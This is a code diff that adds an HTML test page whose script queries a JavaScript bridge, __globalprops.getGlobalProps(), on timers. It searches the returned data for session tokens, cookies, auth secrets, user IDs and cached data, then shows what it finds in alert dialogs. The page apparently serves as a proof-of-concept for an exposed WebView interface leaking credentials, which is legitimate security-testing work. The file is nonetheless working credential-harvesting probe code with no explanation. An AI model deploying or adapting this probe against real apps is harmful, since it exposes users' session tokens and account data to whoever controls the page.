@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Alert Test</title>
+</head>
+<body>
+<script>
+// 1. getGlobalProps - look for tokens
+setTimeout(function() {
+  var gp = __globalprops.getGlobalProps();
+  // search for token-like keys
+  var s = JSON.stringify(gp);
+  var keywords = ['token', 'session', 'cookie', 'auth', 'secret', 'key_account', 'uid', 'user_id', 'serviceToken', 'access'];
+  var found = [];
+  keywords.forEach(function(k) {
+    var idx = s.toLowerCase().indexOf(k.toLowerCase());
+    if (idx >= 0) {
+      found.push(k + '=>' + s.substring(Math.max(0, idx - 30), idx + 100));
+    }
+  });
+  alert('TOKEN_SCAN:\n' + (found.length ? found.join('\n---\n').substring(0, 4000) : 'NONE FOUND') + '\n\nGP_LEN=' + s.length);
+}, 1000);
+
+// 2. getGlobalProps full first 3000 chars
+setTimeout(function() {
+  var gp = __globalprops.getGlobalProps();
+  alert('GP_HEAD:\n' + JSON.stringify(gp).substring(0, 3500));
+}, 3000);
+
+// 3. getGlobalProps cache_data section
+setTimeout(function() {
+  var gp = __globalprops.getGlobalProps();
+  var s = JSON.stringify(gp);
+  var idx = s.indexOf('cache_data');
+  alert('CACHE_DATA:\n' + (idx >= 0 ? s.substring(idx, idx + 3000) : 'not found'));
+}, 5000);
+</script>
+</body>
+</html>
